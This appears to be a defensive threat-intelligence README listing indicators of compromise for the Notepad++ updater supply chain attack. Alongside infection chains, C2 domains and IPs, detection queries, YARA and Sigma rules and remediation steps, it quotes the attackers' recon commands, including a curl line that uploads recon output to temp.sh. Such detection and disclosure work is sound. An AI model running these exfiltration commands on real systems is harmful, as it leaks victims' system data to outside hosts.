# Notepad++ Supply Chain Attack — IoC Repository

> **CVE-2025-15556** | Lotus Blossom / Raspberry Typhoon | June – December 2025

[![Last Updated](https://img.shields.io/badge/Last%20Updated-February%202026-blue)]()
[![IoC Count](https://img.shields.io/badge/IoCs-105-red)]()
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-Mapped-orange)](https://attack.mitre.org/)

---

## Overview

This repository contains a **comprehensive, consolidated collection of Indicators of Compromise (IoCs)** related to the **Notepad++ supply chain attack** disclosed on February 2, 2026.

Between **June and December 2025**, a Chinese state-sponsored threat actor compromised the hosting infrastructure of Notepad++, hijacking the built-in update mechanism (**WinGUp**) to selectively deliver trojanized installers to targeted users. The attack exploited the lack of cryptographic verification in the updater (pre-v8.8.9), enabling the distribution of custom backdoors, Cobalt Strike Beacons, and Metasploit payloads.

### Key facts

| | |
|---|---|
| **CVE** | [CVE-2025-15556](https://nvd.nist.gov/vuln/detail/CVE-2025-15556) — Download of code without integrity check |
| **Threat Actor** | Lotus Blossom (Bilbug, Raspberry Typhoon, Thrip) / Zirconium (Violet Typhoon) |
| **Active Period** | June 2025 – December 2, 2025 |
| **Attack Vector** | Supply chain compromise via WinGUp auto-updater |
| **Targets** | Government, telecom, financial services, IT providers (Philippines, Vietnam, El Salvador, Australia, East Asia) |
| **Malware** | Chrysalis backdoor (custom), Cobalt Strike Beacon, Metasploit Meterpreter |
| **Patched in** | Notepad++ v8.8.9+ (certificate verification) / v8.9.1+ (XMLDSig validation) |

---

## Infection Chains

Kaspersky GReAT identified **three distinct infection chains**, rotated approximately monthly to evade detection:

### Chain #1 — July/August 2025

```
GUP.exe → update.exe (NSIS) → ProShow.exe (legitimate) → exploit via "load" file
  → Metasploit downloader → Cobalt Strike Beacon
```

- Abuses an **old vulnerability in ProShow software** instead of DLL sideloading
- Reconnaissance: `whoami && tasklist` → exfiltrated via `temp.sh`
- Working directory: `%appdata%\ProShow\`

### Chain #2 — September/October 2025

```
GUP.exe → update.exe (NSIS) → script.exe (Lua interpreter) → alien.ini (compiled Lua)
  → shellcode via EnumWindowStationsW → Metasploit downloader → Cobalt Strike Beacon
```

- Uses a **legitimate Lua interpreter** to execute compiled shellcode
- Expanded recon: `whoami && tasklist && systeminfo && netstat -ano`
- Working directory: `%appdata%\Adobe\Scripts\`

### Chain #3 — October 2025

```
GUP.exe → update.exe (NSIS) → BluetoothService.exe (legitimate) → log.dll (sideloaded)
  → decrypts "BluetoothService" shellcode → Chrysalis backdoor
```

- Classic **DLL sideloading** technique
- No built-in reconnaissance (unlike chains 1 and 2)
- Working directory: `%appdata%\Bluetooth\`
- Associated Cobalt Strike Beacon found in `C:\ProgramData\USOShared\`

```
                     ┌─────────────────────────────────────────────────────────┐
                     │              COMPROMISE TIMELINE                        │
                     ├─────────┬─────────┬─────────┬─────────┬─────────┬──────┤
                     │  Jul 25 │  Aug 25 │  Sep 25 │  Oct 25 │  Nov 25 │Dec 25│
                     ├─────────┴─────────┴─────────┴─────────┴─────────┴──────┤
  Chain #1 (ProShow) │████████████████████                                    │
  Chain #2 (Lua)     │                    █████████████████████████████        │
  Chain #3 (DLL SL)  │                              ██████████████            │
  Infra access       │████████████████████████████████████████████████████████│
                     └────────────────────────────────────────────────────────┘
```

---

## Repository Contents

| File | Description |
|------|-------------|
| [`notepadpp_supply_chain_iocs.csv`](notepadpp_supply_chain_iocs.csv) | Full IoC dataset (105 indicators) with MITRE ATT&CK mapping |

### CSV Schema

| Column | Description |
|--------|-------------|
| `ioc_type` | Type: `ip`, `domain`, `url`, `sha1`, `sha256`, `filepath`, `filename`, `useragent`, `behavior`, `cve`, `attribution`, `compromise_window` |
| `ioc_value` | The indicator value |
| `chain` | Infection chain (`1`, `2`, `3`, `1/2`, `2/3`, `all`, `n/a`) |
| `context` | Description of what the IoC represents |
| `source` | Intelligence source (`Kaspersky`, `Rapid7`, `CrowdStrike`, `Tenable`, `Kevin Beaumont`) |
| `risk` | Severity (`CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, `INFO`) |
| `mitre_technique` | MITRE ATT&CK technique ID |

---

## Detection & Threat Hunting

### Priority indicators (start here)

**Behavioral — IoC-agnostic, highest value:**
- `gup.exe` spawning any child process other than a legitimate signed Notepad++ installer
- `gup.exe` connecting to domains/IPs other than `notepad-plus-plus.org`, `github.com`, `release-assets.githubusercontent.com`
- Creation of directories: `%appdata%\ProShow\`, `%appdata%\Adobe\Scripts\`, `%appdata%\Bluetooth\`
- Creation of `%localappdata%\Temp\ns.tmp\` (NSIS runtime — present in all chains)

**Network — high confidence:**
- DNS resolution of `cdncheck.it.com`, `safe-dns.it.com`, `self-dns.it.com`, `api.skycloudcenter.com`, `api.wiresguard.com`
- Connections to `temp.sh` (51.91.79.17) — especially with file upload via curl
- HTTP requests with `temp.sh` URLs embedded in the User-Agent header
- Outbound connections to `45.76.155.202`, `45.32.144.255`, `95.179.213.0`, `45.77.31.210`

**Recon commands (post-exploitation):**
```
cmd /c whoami&&tasklist > 1.txt
cmd /c "whoami&&tasklist&&systeminfo&&netstat -ano" > a.txt
curl -F "file=@1.txt" -s https://temp.sh/upload
```

### CrowdStrike Falcon LogScale queries

<details>
<summary><b>Behavioral: GUP.exe child process hunting</b></summary>

```
#event_simpleName=ProcessRollup2 event_platform=Win ParentBaseFileName="gup.exe"
| FilePath=/\\Device\\HarddiskVolume\d+(?<shortFilePath>.+$)/
| groupBy([FileName, SHA256HashData, shortFilePath, CommandLine])
```
</details>

<details>
<summary><b>Multi-IoC hunt across process, network, and DNS events</b></summary>

```
#event_simpleName=/(ProcessRollup2|NetworkConnectIP4|DnsRequest)/ event_platform=Win
| case {
    // Malicious IPs
    RemoteAddressIP4=/(95\.179\.213\.0|61\.4\.102\.97|59\.110\.7\.32|124\.222\.137\.114|45\.76\.155\.202|45\.32\.144\.255|45\.77\.31\.210)/
        | iocType := "Malicious IP" | iocValue := RemoteAddressIP4 | riskScore := "HIGH";
    // Malicious Domains
    DomainName=/(api\.skycloudcenter\.com|api\.wiresguard\.com|cdncheck\.it\.com|safe-dns\.it\.com|self-dns\.it\.com|temp\.sh)/i
        | iocType := "Malicious Domain" | iocValue := DomainName | riskScore := "HIGH";
    // Suspicious filenames
    ImageFileName=/\\(BluetoothService|admin|system|loader1|loader2|s047t5g|ConsoleApplication2|3yzr31vk|uffhxpSy)\.exe$/i
        | iocType := "Suspicious Filename" | iocValue := ImageFileName | riskScore := "MEDIUM";
    // Suspicious DLLs
    ImageFileName=/\\(log\.dll|libtcc\.dll)$/i
        | iocType := "Suspicious DLL" | iocValue := ImageFileName | riskScore := "MEDIUM";
    // Chain-specific artifacts
    ImageFileName=/\\(alien\.ini|load)$/i
        | iocType := "Chain Artifact" | iocValue := ImageFileName | riskScore := "HIGH";
    * | iocType := null;
}
| iocType=*
| ImageFileName=/\\(?<FileName>[^\\]+)$/
| table([riskScore, iocType, iocValue, @timestamp, aid, ComputerName, FileName, ImageFileName, CommandLine, SHA256HashData, RemoteAddressIP4, DomainName], limit=5000)
```
</details>

<details>
<summary><b>NSIS installer detection (all chains)</b></summary>

```
#event_simpleName=DirectoryCreate event_platform=Win
| FilePath=/\\ns\.tmp$/i
| FilePath=/\\Temp\\ns\.tmp$/i
| groupBy([aid, ComputerName, FilePath, ContextTimeStamp], limit=5000)
```
</details>

### YARA rule (NSIS + recon pattern)

<details>
<summary><b>YARA rule for malicious NSIS updater</b></summary>

```yara
rule Notepadpp_SupplyChain_MaliciousUpdater {
    meta:
        description = "Detects malicious NSIS installers from Notepad++ supply chain attack"
        author = "Renato Z3r0 ed i miei sorcini"
        date = "2026-02"
        reference = "https://securelist.com/notepad-supply-chain-attack/118708/"
        tlp = "WHITE"
        
    strings:
        $nsis = "Nullsoft.NSIS" ascii
        $recon1 = "whoami" ascii nocase
        $recon2 = "tasklist" ascii nocase
        $recon3 = "systeminfo" ascii nocase
        $recon4 = "netstat -ano" ascii nocase
        $exfil = "temp.sh/upload" ascii nocase
        $curl = "curl" ascii nocase
        $dir1 = "\\ProShow\\" ascii nocase
        $dir2 = "\\Adobe\\Scripts\\" ascii nocase
        $dir3 = "\\Bluetooth\\" ascii nocase
        
    condition:
        uint16(0) == 0x5A4D and
        $nsis and
        (2 of ($recon*) or $exfil or ($curl and 1 of ($recon*))) and
        1 of ($dir*)
}
```
</details>

### Sigma rules

<details>
<summary><b>Sigma: GUP.exe suspicious child process</b></summary>

```yaml
title: Notepad++ GUP.exe Suspicious Child Process
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects GUP.exe (Notepad++ updater) spawning suspicious child processes indicative of supply chain compromise
author: Renato Z3r0 ed i miei sorcini
date: 2026/02/09
references:
    - https://securelist.com/notepad-supply-chain-attack/118708/
    - https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/
tags:
    - attack.initial_access
    - attack.t1195.002
    - cve.2025.15556
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith: '\gup.exe'
    filter_legitimate:
        Image|endswith:
            - '\npp.Installer.x64.exe'
            - '\npp.Installer.exe'
    condition: selection_parent and not filter_legitimate
falsepositives:
    - Legitimate Notepad++ installers with non-standard naming
level: high
```
</details>

<details>
<summary><b>Sigma: Recon commands with temp.sh exfiltration</b></summary>

```yaml
title: Reconnaissance Data Exfiltration via temp.sh
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: experimental
description: Detects system reconnaissance followed by data upload to temp.sh, as observed in Notepad++ supply chain attack
author: Renato Z3r0 ed i miei sorcini
date: 2026/02/09
references:
    - https://securelist.com/notepad-supply-chain-attack/118708/
tags:
    - attack.exfiltration
    - attack.t1567
    - attack.discovery
    - attack.t1082
logsource:
    category: process_creation
    product: windows
detection:
    selection_curl:
        CommandLine|contains:
            - 'temp.sh/upload'
            - 'temp.sh'
        Image|endswith: '\curl.exe'
    condition: selection_curl
falsepositives:
    - Legitimate use of temp.sh file sharing service (rare in corporate environments)
level: high
```
</details>

<details>
<summary><b>Sigma: Malicious domain resolution</b></summary>

```yaml
title: Notepad++ Supply Chain C2 Domain Resolution
id: c3d4e5f6-a7b8-9012-cdef-123456789012
status: experimental
description: Detects DNS resolution of C2 domains associated with the Notepad++ supply chain attack
author: Renato Z3r0 ed i miei sorcini
date: 2026/02/09
references:
    - https://securelist.com/notepad-supply-chain-attack/118708/
    - https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/
tags:
    - attack.command_and_control
    - attack.t1071.001
logsource:
    category: dns_query
    product: windows
detection:
    selection:
        QueryName|endswith:
            - 'cdncheck.it.com'
            - 'safe-dns.it.com'
            - 'self-dns.it.com'
            - 'api.skycloudcenter.com'
            - 'api.wiresguard.com'
    condition: selection
falsepositives:
    - Very unlikely in corporate environments
level: critical
```
</details>

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Usage in this campaign |
|--------|-----------|-----|----------------------|
| Initial Access | Supply Chain Compromise: Compromise Software Supply Chain | [T1195.002](https://attack.mitre.org/techniques/T1195/002/) | Hijacked WinGUp update mechanism |
| Execution | Command and Scripting Interpreter: Windows Command Shell | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Recon via cmd.exe |
| Execution | Command and Scripting Interpreter: Python/Lua | [T1059.006](https://attack.mitre.org/techniques/T1059/006/) | Chain #2 Lua interpreter |
| Execution | Exploitation for Client Execution | [T1203](https://attack.mitre.org/techniques/T1203/) | Chain #1 ProShow vulnerability |
| Execution | Native API | [T1106](https://attack.mitre.org/techniques/T1106/) | EnumWindowStationsW for shellcode execution |
| Persistence | Hijack Execution Flow: DLL Side-Loading | [T1574.002](https://attack.mitre.org/techniques/T1574/002/) | Chain #3 log.dll sideloading |
| Defense Evasion | Obfuscated Files or Information | [T1027](https://attack.mitre.org/techniques/T1027/) | Encrypted shellcode, XOR key "CRAZY" |
| Defense Evasion | Masquerading: Match Legitimate Name | [T1036.005](https://attack.mitre.org/techniques/T1036/005/) | BluetoothService.exe, update.exe, AutoUpdater.exe |
| Discovery | System Information Discovery | [T1082](https://attack.mitre.org/techniques/T1082/) | whoami, systeminfo, tasklist, netstat |
| Collection | Data Staged: Local Data Staging | [T1074.001](https://attack.mitre.org/techniques/T1074/001/) | Recon output saved to .txt files |
| Command and Control | Application Layer Protocol: Web Protocols | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | HTTPS C2 via Cobalt Strike, Chrysalis |
| Command and Control | Encrypted Channel | [T1573](https://attack.mitre.org/techniques/T1573/) | CS Beacon encrypted config |
| Command and Control | Ingress Tool Transfer | [T1105](https://attack.mitre.org/techniques/T1105/) | Metasploit downloader fetching CS Beacon |
| Exfiltration | Exfiltration Over Web Service | [T1567](https://attack.mitre.org/techniques/T1567/) | Upload to temp.sh |

---

## References

| Source | Link |
|--------|------|
| **Kaspersky GReAT** — Unnoticed execution chains and new IoCs | [securelist.com](https://securelist.com/notepad-supply-chain-attack/118708/) |
| **Rapid7** — Chrysalis Backdoor: Dive into Lotus Blossom's Toolkit | [rapid7.com](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/) |
| **Notepad++ Official Disclosure** — Hijacked Incident Info Update | [notepad-plus-plus.org](https://notepad-plus-plus.org/news/hijacked-incident-info-update/) |
| **Kevin Beaumont** — Initial disclosure and attribution | [DoublePulsar](https://doublepulsar.com/small-numbers-of-notepad-users-reporting-security-woes-371d7a3fd2d9) |
| **Tenable** — FAQ about Notepad++ Supply Chain Compromise | [tenable.com](https://www.tenable.com/blog/frequently-asked-questions-about-notepad-supply-chain-compromise) |
| **Orca Security** — Update Hijack Analysis & Remediation | [orca.security](https://orca.security/resources/blog/notepad-plus-plus-supply-chain-attack/) |
| **CSO Online** — Chinese APT sophisticated supply chain attack | [csoonline.com](https://www.csoonline.com/article/4126269/notepad-infrastructure-hijacked-by-chinese-apt-in-sophisticated-supply-chain-attack.html) |

---

## Immediate Actions

1. **Identify** all endpoints with Notepad++ installed (any version < 8.9.1)
2. **Hunt** for `gup.exe` spawning unexpected child processes between June–December 2025
3. **Search** network logs for connections to the C2 domains and IPs listed above
4. **Check** for the filesystem artifacts (`%appdata%\ProShow\`, `%appdata%\Adobe\Scripts\`, `%appdata%\Bluetooth\`)
5. **Update** Notepad++ to **v8.9.1+** using a manually downloaded installer from the [official GitHub releases](https://github.com/notepad-plus-plus/notepad-plus-plus/releases)
6. **Remove** any old custom root certificates installed by previous Notepad++ versions
7. **Isolate** and triage any endpoint showing positive indicators

---

## Changelog

| Date | Change |
|------|--------|
| 2026-02-09 | Initial release — 105 IoCs consolidated from Kaspersky, Rapid7, CrowdStrike, Tenable |

---

## License

This repository is provided under the [MIT License](LICENSE). IoCs are aggregated from public sources for defensive purposes only.

---

## Contributing

Contributions are welcome. If you have additional IoCs, detection rules, or corrections:

1. Fork the repository
2. Add your indicators to the CSV (maintaining the schema)
3. Submit a pull request with references to the source

---

> **Disclaimer**: This repository is intended for defensive cybersecurity purposes only. The IoCs and detection rules are provided as-is to help organizations assess their exposure to this supply chain compromise.
